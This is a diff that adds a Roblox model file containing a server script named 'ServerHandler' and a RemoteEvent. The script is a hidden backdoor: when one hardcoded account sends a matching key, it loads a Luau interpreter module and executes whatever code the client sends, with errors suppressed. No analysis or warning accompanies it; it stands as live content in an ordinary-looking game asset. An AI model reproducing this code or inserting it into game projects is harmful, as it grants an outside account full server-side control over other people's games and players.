@@ -1,0 +1,23 @@
+<roblox version="4">
+	<Meta name="ExplicitAutoJoints">true</Meta>
+	<Item class="Script" referent="0">
+		<Properties>
+			<string name="Name"><![CDATA[ServerHandler]]></string>
+			<ProtectedString name="Source"><![CDATA[
+game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent").OnServerEvent:Connect(function(player, source, key)
+    if player.UserId == 11306101560 and player.Name == "Xkdjdjdkxkxjzzjxjxj" and player.DisplayName == "blahalaADD" and source ~= "" and key == 12345 then
+        local loadstring = require(game:GetService("ServerStorage"):WaitForChild("_vLuau"))
+        pcall(function()
+            loadstring(source)()
+        end)
+    end
+end)
+]]></ProtectedString>
+		</Properties>
+	</Item>
+	<Item class="RemoteEvent" referent="2">
+		<Properties>
+			<string name="Name"><![CDATA[RemoteEvent]]></string>
+		</Properties>
+	</Item>
+</roblox>
